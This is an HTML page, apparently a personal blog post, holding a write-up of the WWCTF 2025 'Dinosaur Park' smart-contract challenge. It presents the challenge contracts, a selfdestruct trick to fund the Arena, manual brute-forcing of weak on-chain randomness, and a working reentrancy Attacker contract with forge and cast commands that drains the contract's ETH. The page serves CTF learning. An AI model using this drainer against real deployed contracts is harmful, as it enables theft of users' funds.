@@ -1,0 +1,381 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Yier Lin</title>
+  <meta name="description" content="CTF writeup for WWCTF 2025: Dinosaur Park" />
+  <link href="/assets/css/main.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+  <script src="/assets/js/math.js"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+  </script>
+</head>
+
+<body>
+  <div class="wrap">
+
+  <header class="site-header">
+    <div class="logo">
+    <h1>WWCTF 2025 — Dinosaur Park</h1>
+    </div>
+    <nav class="navbar">
+        <a href="/index.html">Home</a>
+        <a href="/security/writeups/index.html">Writeup</a>
+    </nav>
+  </header>
+
+    <hr>
+
+    <main id="top">
+      <img class="responsive" src="/assets/img/dinosaurpark.png" alt="dinosaurpark.png"></img>
+
+        <section>
+        <h2 id="summary">Summary </h2>
+        <div id="summary-md">
+          <p>The problem should not be very hard, but it still caused me some trouble due to some issues when using Foundry scripting.
+Let us first create an instance of the smart contract.</p>
+
+          <p>Let us first create an instance of the smart contract.</p>
+        </div>
+
+        <img class="responsive" src="/assets/img/dinosaurpark1.png" alt="dinosaurpark1.png"></img>
+
+        <p>
+          There are two contracts in this challenge: The DinoPark contract (setup contract) handles the deployment of the arena and checks that the win condition is satisfied.
+          The goal is to call the ClaimGoldenEgg function using only the provided EOA address: <code>0x973C78957f6E4B473eF4054110cAA2a1aB80F0b6</code>.
+          (Note: If we deploy a contract and use it to call <code>ClaimGoldenEgg</code>, the challenge will consider it unsolved.)
+          For brevity, I have removed unrelated functions and variables from the contract DinoPark.
+        </p>
+
+        <p>
+          For brevity, I have removed unrelated functions and variables from the contract DinoPark.
+        </p>
+        <pre><code class="language-solidity">// DinoPark.sol
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.19;
+
+import "./Arena.sol";
+
+contract DinoPark {
+    address public owner;
+    address public goldenEggHolder;
+    Arena public arena;
+
+    mapping(address => uint256) public patronStake;
+    mapping(uint256 => string) public dinoNames;
+
+    constructor() payable {
+        owner = msg.sender;
+        goldenEggHolder = address(this);
+        arena = new Arena{value: 0.5 ether}(address(this));
+    }
+
+    function claimGoldenEgg() external {
+        require(arena.isChampion(msg.sender), "DinoPark: Not a champion!");
+        require(address(arena).balance <= 1 wei, "DinoPark: Arena still has funds!");
+        goldenEggHolder = msg.sender;
+    }
+
+    function stakeForPark() external payable {
+        patronStake[msg.sender] += msg.value;
+    }
+
+    function isSolved() external view returns (bool) {
+        return goldenEggHolder == msg.sender;   
+    }
+}</code></pre>
+
+      <p>
+        The Arena contract is created by DinoPark. Again, unrelated functions are omitted for brevity.
+      </p>
+      
+      <pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.19;
+
+contract Arena {
+    address public immutable parkContract;
+
+    uint256 public constant PRIZE_MONEY = 0.1 ether;
+    uint256 public constant PLAYER_STRENGTH = 470;
+    uint256 public parkRaptorStrength = 500;
+
+    enum FightMode { Normal, Ranked }
+
+    mapping(address => bool) public isFighting;
+    mapping(address => bool) public champions;
+
+    constructor(address _park) payable {
+        parkContract = _park;
+    }
+
+    function prepareArena() internal view {
+        uint256 currentBalance = address(this).balance;
+        require(currentBalance >= 0.2 ether, "Capital Audit: Stage 1 Failed.");
+        require(currentBalance >= 0.4 ether, "Capital Audit: Stage 2 Failed.");
+        require(currentBalance >= 0.6 ether, "Capital Audit: Stage 3 Failed.");
+    }
+
+    function fight(uint8 guess, FightMode mode) external {
+        if (!isFighting[msg.sender]) {
+            prepareArena();
+            isFighting[msg.sender] = true;
+        }
+
+        bool playerWins = _didPlayerWin(guess, mode);
+
+        if (playerWins) {
+            champions[msg.sender] = true;
+            (bool sent, ) = msg.sender.call{value: PRIZE_MONEY}("");
+            require(sent, "Arena: Failed to send prize");
+        }
+
+        isFighting[msg.sender] = false;
+    }
+
+    function _didPlayerWin(uint8 guess, FightMode mode) internal view returns (bool) {
+        uint256 raptor = parkRaptorStrength;
+        if (mode == FightMode.Ranked) {
+            raptor += 100;
+        }
+
+        uint8 roll = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);
+
+        uint256 totalPlayer = PLAYER_STRENGTH + roll;
+        return (guess == roll) && (totalPlayer > raptor);
+    }
+
+    function isChampion(address _player) external view returns (bool) {
+        return champions[_player];
+    }
+
+}</code></pre>
+
+        <p>
+          We need to do two things to be able to claim the GoldenEgg from DinoPark.
+        </p>
+        <ol>
+          <li>Ensure the Arena has less than 1 wei of ETH.</li>
+          <li>As an EOA, win the fight once in Arena.</li>
+        </ol>
+        <p>Let us first simplify the problem by focusing on how to drain all the ETH from the <code>Arena</code>. The <code>Arena</code> starts with 0.5 ETH and pays out 0.1 ETH for each fight won.</p>
+        
+        <p>Winning a fight requires two things:</p>
+        <ol>
+          <li>The random number roll generated between 0 and 99 is actually between 31 and 99, due to the requirement 470 + roll > 500.</li>
+          <li>Guessing the roll correctly. The roll is generated as a combination of block.timestamp and block.prevrandao:</li>
+        </ol>
+        <pre><code class="language-solidity">uint8 roll = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);</code></pre>
+        
+        <p>
+          To start the fight, the <code>Arena</code> must have at least 0.6 ETH. However, it currently has only 0.5 ETH. So we need to find a way to send ETH to the <code>Arena</code>. The contract does not have a payable function or a receive/fallback function to accept ETH. However, there is another way to send ETH to a contract: using <code>selfdestruct</code>.
+        </p>
+
+        <p>We deploy a contract with 0.4 ETH (although 0.1 ETH is actually enough) and donate all of it to the Arena by self-destructing the contract to send ETH to it.</p>
+
+        <p>Use <code>forge script</code> for the deployment of Step1.s.sol:</p>
+        
+        <pre><code class="language-solidity">forge script Step1 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast</code></pre>
+        <pre><code class="language-solidity">// Step1.s.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {Script, console} from "forge-std/Script.sol";
+import {Donator} from "src/Donator.sol";
+import {IPark} from "src/IPark.sol";
+
+contract Step1 is Script {
+
+    address park = 0xd705b1CF40CFF85337fDc50245BAe4e72D75bf99;
+    address arena = address(IPark(park).arena()); 
+    
+    function run() external {
+        vm.startBroadcast();
+        console.log(arena);
+        Donator donator = new Donator{value:0.4 ether}();
+        donator.donate(arena);
+        console.log(arena.balance);
+        vm.stopBroadcast();
+    }
+}</code></pre>
+
+    <p>To ensure the selfdestruct and donation is successful, we can use
+    <pre><code class="language-solidity">cast balance {arena_address} --rpc-url $RPC_URL</code></pre>
+    to verify that the Arena's balance is now 0.5 + 0.4 = 0.9 ETH.</p>
+
+    <p>We can start the fight. We drain the Arena's tokens using a reentrancy attack. The reentrancy attack works here because the contract violates the checks-effects-interactions pattern: 
+      the interaction <code>ETH transfer</code> is executed before the effect <code>isFighting[msg.sender] = false</code>. This allows us to deploy the following Attacker contract to drain all the tokens.</p>
+
+    <pre><code class="language-solidity">forge script Step3 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast</code></pre>
+    <pre><code class="language-solidity">// Step3.s.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {Script, console} from "forge-std/Script.sol";
+import {Attacker} from "src/Attacker.sol";
+import {IArena} from "src/IArena.sol";
+import {IPark} from "src/IPark.sol";
+
+contract Step3 is Script {
+    address park = 0xd705b1CF40CFF85337fDc50245BAe4e72D75bf99;
+    address arena = address(IPark(park).arena()); 
+    function run() external {
+        vm.startBroadcast();
+        Attacker attacker = new Attacker(park, arena);
+        attacker.attack();
+        vm.stopBroadcast();
+    }
+}</code></pre>
+    <pre><code class="language-solidity">// Attacker.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {IArena} from "./IArena.sol";
+import {IPark} from "./IPark.sol";
+
+contract Attacker {
+    
+    address park;
+    address arena;
+    uint256 num;
+    
+    constructor(address _park, address _arena) {
+        park = _park;
+        arena = _arena; 
+    }
+
+    function attack() public {
+        for (uint8 i = 31; i < 100; i++) {
+            num = i;
+            (bool success,) = arena.call(abi.encodeWithSignature("fight(uint8,uint8)", i, 0));
+            if (!success) revert();
+            if (isWin()) break;
+        }
+    }
+
+    function attackAgain() public {
+        (bool success,) = arena.call(abi.encodeWithSignature("fight(uint8,uint8)", num, 0));
+        if (!success) revert();
+    }
+
+    function isWin() public view returns(bool){
+        return IArena(arena).isChampion(address(this));
+    }
+
+    function arenaBalance() external view returns(uint256){
+        return arena.balance;
+    }
+    
+    receive() external payable {
+        if (arena.balance > 0) {
+            attackAgain();
+        }
+    }
+}</code></pre>
+
+    <p>Note that the <code>Attacker</code> only needs to guess the random number correctly once. We can then store this number and reuse it for subsequent guesses during reentrancy (instead of brute-forcing again). This works because the entire attack occurs within a single transaction, 
+      so <code>block.timestamp</code> and <code>block.prevrandao</code> remain unchanged throughout the transaction, as does the roll. Since the roll is between 0 and 99, we have around a 70% probability of successfully draining the funds.</p>
+
+<p>Before draining the funds, we need to do one more thing: we only need to make the EOA (ourselves) win once. At first, I naively thought the logic would be the same and that I could use the following script:</p>
+
+<pre><code class="language-solidity">forge script Step2 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast</code></pre>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {Script, console} from "forge-std/Script.sol";
+import {Attacker} from "src/Attacker.sol";
+import {IArena} from "src/IArena.sol";
+import {IPark} from "src/IPark.sol";
+
+contract Step2 is Script {
+    address park = 0xd705b1CF40CFF85337fDc50245BAe4e72D75bf99;
+    address arena = address(IPark(park).arena()); 
+    address player = 0x973C78957f6E4B473eF4054110cAA2a1aB80F0b6;
+    function run() external {
+        vm.startBroadcast(player);
+        
+        for (uint256 i = 31; i < 100; i++) {
+            IArena(arena).fight(i, 0);
+            if (IArena(arena).isChampion(player)) break;
+        }
+        vm.stopBroadcast();
+    }
+}</code></pre>
+
+    <p>However, this does not work because, in the Forge script, each fight is considered a separate transaction. Moreover, I still don’t understand why, but whether I use</p>
+
+    <pre><code class="language-solidity">IArena(arena).fight(i, 0); // guessing different number each time</code></pre>
+
+    or
+
+    <pre><code class="language-solidity">IArena(arena).fight(31, 0) // guessing the same number each time</code></pre>
+
+    <p><b>[Update: The reason is clear now, we need to specify the gas for each fight in the loop, since when we guess wrong, it will cause around 30000 gas, but it we guess correctly, it will cause 50000 gas. So if we do not specify the gas, it will cause a revert when we guess correctly.]</b></p>
+
+    <p>Both approaches fail to make the EOA win a fight not matter how many times I call it. I do not understand the reason, as it does not make sense from the probability point of view. However, after testing locally, I found that using forge script as shown above makes it impossible for us to win a fight. Still not sure why but definitely related to the randomness in <code>block.prevrandao</code>.</p>
+
+    <p>So what I actually did was manually brute forcing. I kept sending
+
+    <pre><code class="language-solidity">cast send {arena_address} "fight(uint8,uint8)" 31 0 --rpc-url $RPC_URL --private-key $PRIVATE_KEY</code></pre>
+
+    and check <code>isChampion(EOA)</code> from time to time. After sending this command 50–60 times, I found that the EOA had become the champion.</p>
+
+    <p>So to summarize, the solution is composed of the following steps</p> 
+    <p>1. Run
+
+<pre><code class="language-solidity">forge script Step1 - rpc-url $RPC_URL - private-key $PRIVATE_KEY - broadcast</code></pre>
+to donate 0.4 ETH to Arena, which allows us to start the fight.
+</p>
+
+<p>2. Keep running
+<pre><code class="language-solidity">cast send {arena_address} "fight(uint8,uint8)" 31 0 --rpc-url $RPC_URL --private-key $PRIVATE_KEY</code></pre>
+until the EOA becomes a champion.</p>
+
+<p>3. Deploy an attacker to drain all the money in Arena (with a 70% success rate)
+<pre><code class="language-solidity">forge script Step3 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast</code></pre></p>
+
+<p>4. Claim the Golden Egg from DinoPark
+<pre><code class="language-solidity">cast send {park_address} "claimGoldenEgg()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast</code></pre>
+This solves the challenge.</p>
+
+      </section>
+
+        <footer>
+          <hr />
+          <p class="muted">© Yier Lin 2025</p>
+      </footer>
+
+    </main>
+  </div>
+
+  <button id="backTop" type="button" aria-label="Back to top">Back to Top ↑</button>
+
+  <script>
+    (function(){
+      const btn = document.getElementById('backTop');
+      const onScroll = () => {
+        if (window.scrollY > 400) btn.classList.add('show');
+        else btn.classList.remove('show');
+      };
+      window.addEventListener('scroll', onScroll, { passive: true });
+      btn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+      onScroll();
+    })();
+  </script>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <script src="/assets/js/code.js"></script>
+
+
+
+</body>
+
+
+</html>
